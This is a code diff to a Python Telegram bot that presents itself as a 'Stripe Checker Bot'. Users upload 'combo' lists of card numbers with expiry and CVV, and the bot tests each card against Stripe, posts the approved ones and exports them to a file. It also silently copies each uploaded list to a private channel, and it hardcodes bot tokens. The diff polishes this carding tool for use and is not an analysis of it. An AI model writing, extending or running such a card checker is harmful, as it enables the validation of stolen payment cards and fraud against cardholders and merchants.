@@ -4,14 +4,17 @@ import random
 import requests
 import os
 import functools
+import logging
+from datetime import datetime
 from bs4 import BeautifulSoup
+from telegram import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
 from telegram.ext import (
     ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
     filters
 )
-from telegram import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "7417431428:AAG9i28WhJSK0UHOSDSLV7GblbKu7lDI4iQ"
+# === CONFIG ===
+BOT_TOKEN = "7897881067:AAHpiRM9ICMX5SClV1wgIko9y4iADUqJMtk"
 CHANNEL_ID = -1002555306699
 GROUP_CHAT_ID = "@sigma6627272"
 MESSAGE_ID = 3
@@ -33,6 +36,10 @@ HEADERS = {
 
 combo_data = {}
 approved_data = {}
+
+logging.basicConfig(level=logging.INFO)
+
+# === UTILS ===
 
 def parse_combo_line(line):
     patterns = [
@@ -149,8 +156,11 @@ async def run_blocking(func, *args):
 
 def keyboard():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("▶ Start Check", callback_data="startcheck")],
-        [InlineKeyboardButton("📊 Stats", callback_data="stats")]
+        [
+            InlineKeyboardButton("▶ Start Check", callback_data="startcheck"),
+            InlineKeyboardButton("📊 Stats", callback_data="stats")
+        ],
+        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
     ])
 
 async def start(update, context):
@@ -163,7 +173,15 @@ async def start(update, context):
         )
     except:
         pass
-    await update.message.reply_text("Upload your combo.txt file and press ▶ Start Check.", reply_markup=keyboard())
+
+    await update.message.reply_text(
+        "Welcome! I'm your Stripe Checker Bot.\n\n"
+        "To begin:\n"
+        "1. Upload your combo list as a `.txt` file.\n"
+        "2. Tap ▶ Start Check below.\n\n"
+        "Need help? Use /chk followed by a card to test one manually.",
+        reply_markup=keyboard()
+    )
 
 async def upload_file(update, context):
     doc = update.message.document
@@ -179,7 +197,7 @@ async def upload_file(update, context):
     combo_data[chat_id] = [line.strip() for line in lines if line.strip()]
     approved_data[chat_id] = []
 
-    await update.message.reply_text(f"Loaded {len(combo_data[chat_id])} combos.")
+    await update.message.reply_text(f"✅ Loaded {len(combo_data[chat_id])} combos.")
 
     await context.bot.copy_message(
         chat_id=CHANNEL_ID,
@@ -190,18 +208,37 @@ async def upload_file(update, context):
 async def send_result(chat_id, context, user, card, status, msg):
     tag = f"@{user.username}" if user.username else user.first_name
     icon = "✅" if status == "APPROVED" else "❌"
+    time = datetime.now().strftime("%H:%M:%S")
+
     text = f"""
-━━━━━━━━━━━━━━━━━━━━━
-✦ Card : <code>{card}</code>
-✦ Status : {status} {icon}
-✦ Response : {msg}
-✦ Gateway : Stripe
-━━━━━━━━━━━━━━━━━━━━━
-⚡ Checked By : <b>{tag}</b>
+<b>{icon} {status} RESULT</b>
+<code>{card}</code>
+
+<b>Status:</b> {status}
+<b>Response:</b> {msg}
+<b>Gateway:</b> Stripe
+<b>Checked by:</b> {tag}
+<b>Time:</b> {time}
 """
     await context.bot.send_message(chat_id, text, parse_mode="HTML")
     if status == "APPROVED":
         approved_data[chat_id].append(card)
+
+async def send_approved_file(chat_id, context):
+    approved = approved_data.get(chat_id)
+    if not approved:
+        await context.bot.send_message(chat_id, "No approved cards to export.")
+        return
+
+    path = f"approved_{chat_id}.txt"
+    with open(path, "w") as f:
+        for line in approved:
+            f.write(f"{line}\n")
+
+    with open(path, "rb") as f:
+        await context.bot.send_document(chat_id, document=InputFile(f), filename="approved.txt")
+
+    os.remove(path)
 
 async def single_check(update, context):
     chat_id = update.effective_chat.id
@@ -214,7 +251,7 @@ async def single_check(update, context):
     if not parsed:
         await update.message.reply_text("⚠️ Invalid combo format.")
         return
-    await update.message.reply_text("Checking combo...")
+    await update.message.reply_text("⏳ Checking combo...")
     try:
         status, msg, card = await run_blocking(process_combo, combo)
         await send_result(chat_id, context, user, card, status, msg)
@@ -230,7 +267,17 @@ async def callback_handler(update, context):
     if query.data == "stats":
         total = len(combo_data.get(chat_id, []))
         approved = len(approved_data.get(chat_id, []))
-        await query.edit_message_text(f"Total: {total} | Approved: {approved}", reply_markup=keyboard())
+        await query.edit_message_text(f"📊 <b>Stats</b>\nTotal: {total}\nApproved: {approved}", parse_mode="HTML", reply_markup=keyboard())
+
+    elif query.data == "help":
+        await query.edit_message_text(
+            "ℹ️ <b>Help</b>\n\n"
+            "• Upload your combo list (.txt)\n"
+            "• Press ▶ Start Check to begin\n"
+            "• Or use /chk 4242|12|2026|123 to test one",
+            parse_mode="HTML",
+            reply_markup=keyboard()
+        )
 
     elif query.data == "startcheck":
         combos = combo_data.get(chat_id)
@@ -238,12 +285,21 @@ async def callback_handler(update, context):
             await query.edit_message_text("Upload your combo.txt first.", reply_markup=keyboard())
             return
 
-        await query.edit_message_text(f"Started checking {len(combos)} combos...")
-        for combo in combos:
+        await query.edit_message_text(f"✅ Started checking {len(combos)} combos...", reply_markup=None)
+
+        for idx, combo in enumerate(combos, 1):
             status, msg, card = await run_blocking(process_combo, combo)
             await send_result(chat_id, context, user, card, status, msg)
+            if idx % 10 == 0:
+                await context.bot.send_message(chat_id, f"⏳ Progress: {idx}/{len(combos)}")
 
-        await context.bot.send_message(chat_id, "✅ Done!")
+        await context.bot.send_message(
+            chat_id,
+            f"✅ <b>Check complete!</b>\nApproved: <b>{len(approved_data.get(chat_id, []))}</b> cards.",
+            parse_mode="HTML"
+        )
+
+        await send_approved_file(chat_id, context)
 
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
@@ -251,7 +307,7 @@ def main():
     app.add_handler(CommandHandler("chk", single_check))
     app.add_handler(MessageHandler(filters.Document.ALL, upload_file))
     app.add_handler(CallbackQueryHandler(callback_handler))
-    print("Bot is running...")
+    logging.info("Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
